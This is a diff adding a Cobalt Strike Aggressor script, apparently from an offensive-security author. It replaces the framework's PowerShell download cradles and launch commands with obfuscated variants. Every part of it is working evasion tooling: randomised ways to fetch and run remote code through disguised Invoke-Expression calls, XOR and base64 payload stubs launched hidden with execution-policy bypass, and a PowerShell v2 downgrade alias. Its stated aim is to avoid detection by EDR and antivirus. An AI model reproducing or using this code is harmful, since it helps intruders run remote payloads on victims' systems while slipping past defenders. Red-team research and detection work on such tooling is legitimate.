@@ -1,0 +1,194 @@
+#
+# Custom Cobalt Strike Powershell Command & Download Cradles
+#
+#   This script introduces several different methods for Powershell download and execution primitives, other
+#   than (Net.WebClient).DownloadString and IEX():
+#
+#		set POWERSHELL_DOWNLOAD_CRADLE {
+#			return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+#		}
+#		[...]
+#
+#		set POWERSHELL_COMMAND {
+#		[...]
+#			return "powershell -nop -w hidden -encodedcommand $script";
+#		}
+#
+#   Aforementioned methods are heavily flagged these days by
+#   EDRs and AVs so we would prefer to avoid their use. It so happens that Cobalt Strike by default embeds them 
+#   excessively, generating lot of noise in such systems. We can tell Cobalt Strike to structure it's Powershell
+#   use patterns differently. However, some of introduced custom methods may not work. In such situations, we
+#   can always switch back to battle tested Cobalt Strike defaults by choosing "Use unsafe Powershell.." to Always. 
+#
+# Watch Script Console for debug logs 
+#
+# Author:
+#   Mariusz B. / mgeeky, '20
+#   <mb [at] binary-offensive.com>
+#   (https://github.com/mgeeky)
+#
+
+
+# For OPSEC reasons we should avoid use of Powershells "-EncodedCommand" parameter and "IEX()" 
+# Invoke-Expression cmdlet, as they are heavily flagged. Yet, their use is very stable and proven to 
+# work stabily across various environments and setups. This script can treat these as follows:
+#   USE_UNSAFE_ENCODEDCOMMAND_AND_IEX = 0;      # Never use them
+#   USE_UNSAFE_ENCODEDCOMMAND_AND_IEX = 1;      # Use them on a seldom occassion (randomly picked)
+#   USE_UNSAFE_ENCODEDCOMMAND_AND_IEX = 2;      # Always use them
+
+global('$USE_UNSAFE_ENCODEDCOMMAND_AND_IEX');
+$USE_UNSAFE_ENCODEDCOMMAND_AND_IEX = 0;      # Never use them
+
+$DEBUG = false;
+
+sub debug {
+	if($DEBUG) {
+		println("[custom-powershell-hooks] " . $1);
+	}
+}
+
+set POWERSHELL_DOWNLOAD_CRADLE {
+    local('$url $strategy $cradle @downloadPrimitives @executionPrimitives $download $execution $downloadPrimitive $executionPrimitive');
+    $url = $1;
+
+    # Each download primitive must download data from given ##URL## (that will be replaced later on)
+    # and put it into $u variable
+    @downloadPrimitives = @(
+        # Unsafe (Net.WebClient).DownloadString
+        "\$u=(New-Object Net.Webclient).DownloadString('##URL##')",
+
+        # PowerShell 3.0+: Invoke-RestMethod
+        "\$u=('##URL##'|%{(IRM \$_)})",
+
+        # (Net.WebClient).DownloadString
+        "\$w=(New-Object Net.WebClient);\$u=\$w.((((\$w).PsObject.Methods)|?{(Item Variable:\_).Value.Name-clike'D*g'}).Name).Invoke('##URL##')",
+
+        # Net.WebRequest
+        "\$u=([IO.StreamReader]::new([Net.WebRequest]::Create('##URL##').GetResponse().GetResponseStream()).ReadToEnd())",
+
+        # Msxml2.XMLHTTP COM object
+        "\$c=New-Object -ComObject MsXml2.ServerXmlHttp;\$c.Open('GET','##URL##',0);\$c.Send();\$u=\$c.ResponseText"
+    );
+
+    # Use $u variable to obtain downloaded data.
+    @executionPrimitives = @(
+        # Unsafe IEX()
+        "IEX(\$u)",
+
+        "&(DIR Alias:/I*X)(\$u)",
+        "\$u|&(DIR Alias:/I*X)",
+
+        "&(GCM I*e-E*)(\$u)",
+        "\$u|&(GCM I*e-E*)",
+
+        "&(''.SubString.ToString()[67,72,64]-Join'')(\$u)",
+        "\$u|&(''.SubString.ToString()[67,72,64]-Join'')"
+    );
+
+
+    if ($USE_UNSAFE_ENCODEDCOMMAND_AND_IEX == 2) {
+        $cradle = "IEX (New-Object Net.Webclient).DownloadString(' $+ $url $+ ')";
+    }
+    else {
+        # Skip known bad combinations of above primitives.
+        # Known to not working (download - execution): 
+        #   * 3 - 3, 3 - 4
+        while(true) {
+            if ($USE_UNSAFE_ENCODEDCOMMAND_AND_IEX == 1) {
+                $download = rand(size(@downloadPrimitives));
+                $execution = rand(size(@executionPrimitives));
+            } 
+            else {
+                $download = rand(size(@downloadPrimitives) - 1) + 1;
+                $execution = rand(size(@executionPrimitives) - 1 ) + 1;
+            }
+
+            if ($download == 3 && ($execution >= 3 && $execution <= 4)) { 
+                continue; 
+            }
+            break;
+        }
+
+        $downloadPrimitive = replace(@downloadPrimitives[$download], '##URL##', $url);
+        $executionPrimitive = @executionPrimitives[$execution];
+
+        $cradle = $downloadPrimitive . ";" . $executionPrimitive;
+        $cradle = replace($cradle, ";;", ";");
+    }
+
+    debug("hooked POWERSHELL_DOWNLOAD_CRADLE (download: $+ $download $+ ; execution: $+ $execution $+ ): $cradle");
+    return $cradle;
+}
+
+set POWERSHELL_COMMAND {
+    local('$strategy $ley $enc $stub $cmd');
+
+    $cmd = "";
+
+    if ($USE_UNSAFE_ENCODEDCOMMAND_AND_IEX == 1) {
+        $strategy = rand(4);
+    } 
+    else {
+        $strategy = rand(3) + 1;
+    }
+
+    if (($USE_UNSAFE_ENCODEDCOMMAND_AND_IEX == 2) || ($strategy == 0)) {
+        #
+        # Default, built in and unsafe Cobalt Strike powershell command template.
+        #
+        $script = transform($1, "powershell-base64");
+    
+        if ($2) {
+            # remote command (e.g., jump psexec_psh)
+            $cmd = "powershell -nop -w hidden -encodedcommand $script";
+        }
+        else {
+            # local command
+            $cmd = "powershell -nop -exec bypass -EncodedCommand $script";
+        }
+    }
+    else if ($strategy == 1) {
+        if ($2) {
+            $cmd = "powershell -nop -noni -w h -c \" $+ $1 $+ \"";
+        }
+        else {
+            $cmd = "powershell -nop -noni -ep bypass -w h -c \" $+ $1 $+ \"";
+        }
+    }
+    else if($strategy == 2) {
+        $key = rand(254) + 1;
+        $enc = replace(transform(str_xor($1, chr($key)), "array"), " ", "");
+        $stub = "&([scriptblock]::Create((( $+ $enc $+ )|%{\$_-bxor $+ $key $+ }|%{[char]\$_})-join''))";
+        
+        if ($2) {
+            $cmd = "powershell -nop -noni -w h -c \" $+ $stub $+ \"";
+        }
+        else {
+            $cmd = "powershell -nop -noni -ep bypass -w h -c \" $+ $stub $+ \"";
+        }
+    }
+    else if ($strategy == 3) {
+        $key = rand(254) + 1;
+        $enc = base64_encode(str_xor($1, chr($key)));
+
+        $stub = "\$t=([type]'Convert');&([scriptblock]::Create((\$t::((\$t.GetMethods()|?{\$_.Name-clike'F*g'}).Name)(' $+ $enc $+ ')|%{\$_-bxor $+ $key $+ }|%{[char]\$_})-join''))";
+
+        if ($2) {
+            $cmd = "powershell -nop -noni -w h -c \" $+ $stub $+ \"";
+        }
+        else {
+            $cmd = "powershell -nop -noni -ep bypass -w h -c \" $+ $stub $+ \"";
+        }
+    }
+
+    debug("hooked POWERSHELL_COMMAND (strategy: $strategy $+ ): $cmd");
+    return $cmd;
+}
+
+alias powershell2 {
+    local('$args');
+    $args = substr($0, strlen("powershell2 "));
+
+    btask($1, "Tasked beacon to run powershell version 2 commands: $args", "T1059");
+    beacon_execute_job($1, "powershell", " -v 2 $args", 0);
+}
